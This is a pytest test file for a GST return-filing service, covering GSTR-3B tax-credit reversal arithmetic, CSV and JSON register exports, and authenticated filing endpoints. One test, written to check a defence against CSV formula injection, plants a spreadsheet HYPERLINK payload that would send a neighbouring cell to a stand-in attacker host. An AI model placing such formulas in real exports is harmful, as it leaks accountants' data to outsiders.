        """Table 4 has to add up inside one document.

        4(C) is 4(A) minus 4(B). Scoping the reversal in one place and not the
        other would leave the three lines of the block contradicting each
        other on the page a business signs.
        """
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )
        self.purchase(
            db_session,
            business,
            invoice_number="P-APR",
            igst=Decimal("20000.00"),
        )

        monkeypatch.setattr(gst_calendar, "today_ist", lambda: date(2027, 6, 2))
        itc = filing_service.build_gstr3b(db_session, business, PERIOD)["itc_elg"]

        assert itc["itc_avl"][0]["iamt"] == 20000.00
        assert itc["itc_rev"][0]["iamt"] == 9000.00
        assert itc["itc_net"]["iamt"] == 11000.00

    def test_an_explicit_as_of_overrides_the_anchor(self, db_session, business):
        """For reconstructing what the return said on a particular day."""
        self.purchase(
            db_session,
            business,
            invoice_number="P-OCT",
            invoice_date=date(2025, 10, 31),
            period="2025-10",
            igst=Decimal("9000.00"),
        )

        early = filing_service.build_gstr3b(
            db_session, business, PERIOD, as_of=date(2026, 4, 1)
        )
        assert early["itc_elg"]["itc_rev"][0]["iamt"] == 0.0


def test_gstr3b_leaves_a_failed_sale_out_of_both_value_and_tax(db_session, business):
    """3.1(a) has to describe one set of invoices, not two.

    The taxable value comes from the filable rows and the tax from the ITC
    summary. When a re-parse fails, the figures from the earlier successful
    read stay on the row — so if the two sides disagree about whether that row
    counts, the return declares ₹1,00,000 of supplies carrying ₹36,000 of tax,
    and the portal rejects it for the arithmetic.
    """
    save(db_session, business.id, sale(invoice_number="S-GOOD"))
    save(
        db_session,
        business.id,
        sale(invoice_number="S-STALE", status=InvoiceStatus.FAILED),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    outward = document["sup_details"]["osup_det"]
    assert outward["txval"] == 100000.00
    assert outward["iamt"] == 18000.00
    # 18% of the declared value, which is the check the portal itself runs.
    assert outward["iamt"] == round(outward["txval"] * 0.18, 2)


# ---------------------------------------------------------------------------
# CSV
# ---------------------------------------------------------------------------

def test_csv_has_a_header_and_one_row_per_invoice(db_session, business):
    save(db_session, business.id, sale(invoice_number="S-1"))
    save(db_session, business.id, sale(invoice_number="S-2"))

    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
    lines = body.strip().split("\r\n")

    assert lines[0].startswith("invoice_number,invoice_date,")
    assert len(lines) == 3
    assert "S-1" in lines[1]


def test_the_csv_row_carries_the_figures_the_ca_is_checking(db_session, business):
    """This file is opened to check a period before it is filed.

    Every column here is one somebody reads against the paper invoice, and a
    column that is right for an inter-state sale and empty for a local one is
    the kind of wrong that survives a review — the reviewer sees a number in
    the head they expected and stops looking.
    """
    save(
        db_session,
        business.id,
        local_sale(
            invoice_number="S-LOCAL",
            cess=Decimal("1000.00"),
            total_value=Decimal("119000.00"),
        ),
    )
    save(db_session, business.id, sale(invoice_number="S-INTER"))

    rows = {
        row["invoice_number"]: row
        for row in csv.DictReader(
            io.StringIO(
                filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
            )
        )
    }

    local = rows["S-LOCAL"]
    assert local["invoice_date"] == "15-04-2026"
    assert local["tax_rate"] == "18.00"
    assert local["taxable_value"] == "100000.00"
    assert local["cgst"] == "9000.00"
    assert local["sgst"] == "9000.00"
    assert local["igst"] == "0.00"
    assert local["cess"] == "1000.00"
    assert rows["S-INTER"]["igst"] == "18000.00"


def test_csv_uses_crlf_for_excel(db_session, business):
    save(db_session, business.id, sale())
    assert "\r\n" in filing_service.to_csv(
        db_session, business, PERIOD, InvoiceType.SALES
    )


def test_csv_of_an_empty_period_is_just_the_header(db_session, business):
    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
    assert body.strip().count("\r\n") == 0


def test_csv_does_not_hand_a_supplier_a_formula_in_the_ca_s_spreadsheet(
    db_session, business
):
    """A trade name is free text, and this file is opened in Excel by design.

    The name arrives from an uploaded invoice, so it is chosen by whoever sent
    the invoice rather than by the business exporting the register. Excel runs
    any cell starting with "=", so without the guard a supplier can make the
    accountant's spreadsheet fetch a URL carrying the row beside it.
    """
    save(
        db_session,
        business.id,
        sale(
            invoice_number="=1+1",
            counterparty_name='=HYPERLINK("http://attacker.example/?"&A2,"Open")',
        ),
    )

    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
    row = next(iter(csv.DictReader(io.StringIO(body))))

    assert row["invoice_number"] == "'=1+1"
    assert row["counterparty_name"].startswith("'=")
    # Defused, not deleted: the register still records what the invoice said.
    assert "attacker.example" in row["counterparty_name"]


def test_csv_leaves_a_negative_amount_as_a_number(db_session, business):
    """A credit note's minus sign is arithmetic, not an injection.

    The numeric columns are formatted by this application rather than typed by
    anyone, so putting them through the formula guard would turn every credit
    note into text that no spreadsheet will total.
    """
    save(db_session, business.id, sale(taxable_value=Decimal("-1000.00")))

    row = next(
        iter(
            csv.DictReader(
                io.StringIO(
                    filing_service.to_csv(
                        db_session, business, PERIOD, InvoiceType.SALES
                    )
                )
            )
        )
    )

    assert row["taxable_value"] == "-1000.00"


def test_csv_values_an_invoice_whose_grand_total_was_never_read(db_session, business):
    """A stored total of zero is "not found on the document", not "worth nil".

    ``total_value`` is only filled when the parser found a grand-total *label*,
    so an invoice whose total was printed as "Amount Payable" carries a stored
    zero. Read straight off the column, the CSV reported a ₹1,18,000 supply as
    worth nothing — in the one artefact a CA opens to check a period before it
    is filed.
    """
    save(db_session, business.id, sale(total_value=Decimal("0.00")))

    row = next(
        iter(
            csv.DictReader(
                io.StringIO(
                    filing_service.to_csv(
                        db_session, business, PERIOD, InvoiceType.SALES
                    )
                )
            )
        )
    )

    assert row["total_value"] == "118000.00"


def test_csv_prefers_the_total_the_document_actually_carried(db_session, business):
    """Deriving is the fallback, not the rule.

    Rounding at the line can leave taxable + tax a rupee off what the invoice
    itself says, and the document is the authority — the derivation exists to
    fill a gap, not to overrule a figure that was read.
    """
    save(db_session, business.id, sale(total_value=Decimal("117999.00")))

    row = next(
        iter(
            csv.DictReader(
                io.StringIO(
                    filing_service.to_csv(
                        db_session, business, PERIOD, InvoiceType.SALES
                    )
                )
            )
        )
    )

    assert row["total_value"] == "117999.00"


def test_the_csv_and_the_json_value_one_invoice_the_same(db_session, business):
    """Two exports of one month must not disagree about what a supply is worth.

    The GSTR-1 JSON has derived a missing total since ``_invoice_value`` was
    written; the CSV read the raw column. Same period, same invoice, two
    downloads, two figures — and the CSV is the one that gets believed, because
    it is the one a human opens.
    """
    save(db_session, business.id, sale(total_value=Decimal("0.00")))

    row = next(
        iter(
            csv.DictReader(
                io.StringIO(
                    filing_service.to_csv(
                        db_session, business, PERIOD, InvoiceType.SALES
                    )
                )
            )
        )
    )
    document = filing_service.build_gstr1(db_session, business, PERIOD)
    json_value = document["b2b"][0]["inv"][0]["val"]

    assert float(row["total_value"]) == json_value


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------

def test_validate_endpoint_reports_issues(auth_client, db_session, business):
    save(db_session, business.id, sale(invoice_number=None))

    response = auth_client.get(f"/api/v1/filing/validate?period={PERIOD}")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["ok"] is False
    assert body["error_count"] == 1
    assert body["issues"][0]["field"] == "invoice_number"


def test_gstr1_endpoint_returns_document_and_validation(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/gstr1?period={PERIOD}")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["return_type"] == "gstr1"
    assert body["document"]["fp"] == "042026"
    assert body["validation"]["ok"] is True


def test_gstr3b_endpoint_returns_the_prefill(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/gstr3b?period={PERIOD}")

    assert response.status_code == 200, response.text
    assert response.json()["document"]["ret_period"] == "042026"


def test_export_json_is_a_named_download(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/export/gstr1.json?period={PERIOD}")

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("application/json")
    cd = response.headers["content-disposition"]
    assert cd.startswith(f'attachment; filename="gstr1_{BUSINESS_GSTIN}_042026.json"')
    assert json.loads(response.text)["gstin"] == BUSINESS_GSTIN


def test_export_csv_carries_a_bom_for_excel(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/export/gstr1.csv?period={PERIOD}")

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("text/csv")
    assert response.text.startswith("﻿")


def test_export_can_produce_the_purchase_register(auth_client, db_session, business):
    save(
        db_session,
        business.id,
        sale(invoice_type=InvoiceType.PURCHASE, invoice_number="P-1"),
    )

    response = auth_client.get(f"/api/v1/filing/export/purchases.csv?period={PERIOD}")

    assert response.status_code == 200
    assert "P-1" in response.text


def test_purchases_cannot_be_exported_as_json(auth_client):
    """There is no portal return built from the purchase register."""
    response = auth_client.get("/api/v1/filing/export/purchases.json")
    assert response.status_code == 400


@pytest.mark.parametrize(
    ("path", "expected"),
    [("/api/v1/filing/export/gstr9.json", 404), ("/api/v1/filing/export/gstr1.pdf", 404)],
)
def test_export_rejects_unknown_types_and_formats(auth_client, path, expected):
    assert auth_client.get(path).status_code == expected


def test_filing_endpoints_require_authentication(client):
    for path in ("/api/v1/filing/validate", "/api/v1/filing/gstr1"):
        assert client.get(path).status_code == 401


def test_filing_does_not_leak_across_tenants(auth_client, db_session, business, other_tenant):
    save(db_session, business.id, sale())

    response = auth_client.get(
        f"/api/v1/filing/gstr1?period={PERIOD}",
        headers={"Authorization": f"Bearer {other_tenant}"},
    )

    assert "b2b" not in response.json()["document"]


def test_an_hsn_in_non_ascii_digits_is_an_error():
    """``isdigit`` is true of ``८४७१``; the portal is not.

    A row stored before the parser folded such digits would otherwise pass
    validation and go out in the HSN summary.
    """
    assert issues_for(sale(hsn_code="८४७१"))["hsn_code"] is Severity.ERROR
    assert "hsn_code" not in issues_for(sale(hsn_code="8471"))
